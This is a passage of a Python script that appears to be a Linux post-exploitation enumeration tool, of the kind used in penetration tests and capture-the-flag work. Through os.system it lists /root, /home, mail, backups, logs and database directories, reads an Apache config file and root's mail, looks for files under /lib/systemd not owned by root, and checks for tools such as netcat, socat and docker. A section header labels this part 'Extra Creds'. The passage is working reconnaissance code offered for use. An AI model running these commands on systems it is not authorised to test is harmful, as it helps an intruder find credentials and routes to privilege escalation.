print("\033[1;31;40m [+]-------------------------------------------------------------- [ Extra Creds ] -------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Look Manually:
print("\n\033[1;34;40m[+] Mail File:\033[0m")
os.system ('ls -la /var/mail/')

print("\n\033[1;34;40m[+] Root Directory:\033[0m")
os.system ('ls -la /root/')

print("\n\033[1;34;40m[+] Home Directory:\033[0m")
os.system ('ls -la /home/')

print("\n\033[1;34;40m[+] tmp Directory:\033[0m")
os.system ('ls -la /tmp')

print("\n\033[1;34;40m[+] Backup Directory:\033[0m")
os.system ('ls -la /var/backups')

print("\n\033[1;34;40m[+] Apache Version:\033[0m")
os.system ('apache2 -v 2>/dev/null; httpd -v 2>/dev/null')

print("\n\033[1;34;40m[+] Apache User:\033[0m")
os.system ("grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null")

print("\n\033[1;34;40m[+] Apache Config File:\033[0m")
os.system ('cat /var/apache2/config.inc')

print("\n\033[1;34;40m[+] MySQL Version:\033[0m")
os.system ('mysql --version 2>/dev/null')

print("\n\033[1;34;40m[+] MySQL:\033[0m")
os.system ('ls -la /var/lib/mysql')

print("\n\033[1;34;40m[+] Log File:\033[0m")
os.system ('ls -la /var/log')

print("\n\033[1;34;40m[+] Spool File:\033[0m")
os.system ('ls -la /var/spool')

print("\n\033[1;34;40m[+] pgsql:\033[0m")
os.system ('ls -la /var/lib/pgsql')

print("\n\033[1;34;40m[+] file-systems mounted:\033[0m")
os.system ('df -h')

print("\n\033[1;34;40m[+] System files dont belong to root:\033[0m")
os.system ('find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null')

print("\n\033[1;34;40m[+] Tools/Languages Installed:\033[0m")
os.system ('which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null')

print("\n\033[1;34;40m[+] Read roots mail:\033[0m")
os.system ('head /var/mail/root 2>/dev/null')

#------------------> Enumeration Completed:
print("\n\n\033[1;31;40m\t\t\tEnumeration is completed ################################################################################## 100%\033[0m")
